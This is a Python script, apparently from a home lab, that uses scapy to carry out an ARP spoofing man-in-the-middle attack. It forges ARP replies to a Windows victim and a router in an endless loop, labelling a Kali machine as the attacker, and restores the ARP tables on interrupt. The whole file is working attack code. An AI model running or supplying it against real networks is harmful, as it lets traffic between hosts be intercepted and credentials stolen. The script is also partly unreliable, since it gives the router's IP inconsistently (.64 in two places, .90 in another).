from scapy.all import *
from scapy.all import ARP
import time

def spoof_victim():
    arp_response = ARP() #create an arp request 
   #  arp_response.show()

    #spoof the victim/target machine 
    arp_response.op = 2
    arp_response.pdst = "192.168.173.237" #WIndow's IP
    arp_response.hwdst = "08:00:27:61:c8:95" #Windows MAC
    arp_response.psrc = "192.168.173.64" #Router's IP

    arp_response.hwsrc = "08:00:27:61:05:9a" #kali MAC (Attacker)
    arp_response.show()

    send(arp_response)

def spoof_router():
    arp_response = ARP()

    #spoof the router/default gateway
    arp_response.op = 2 #packet type
    arp_response.pdst = "192.168.173.90" #Router's IP
    arp_response.hwdst = "f2:d8:da:77:b2:19" #Router's MAC
    arp_response.psrc = "192.168.173.237" #Window's IP

    arp_response.hwsrc = "08:00:27:61:05:9a" #kali MAC (Attacker)
    arp_response.show()

    send(arp_response)

def restore():
    #restoring WIndows ARP table
    arp_restore = ARP (
        op = 2,
        pdst = "192.168.173.237",
        hwdst = "08:00:27:61:c8:95",
        psrc = "192.168.173.64",
        hwsrc = "5a:9a:37:09:c6:88"
    )
    send(arp_restore)

    #restoring Router's ARP table
    arp_restore = ARP (
        op = 2,
        pdst = "192.168.173.64",
        hwdst = "5a:9a:37:09:c6:88",
        psrc = "192.168.173.237",
        hwsrc = "08:00:27:61:c8:95"
    )
    send(arp_restore)



if __name__ == "__main__":
    try:
        while True:
            spoof_victim ()
            spoof_router()
            time.sleep(2)
    except KeyboardInterrupt as err:
     print("Restoring ARP Table")
     restore()
     print(f'exiting')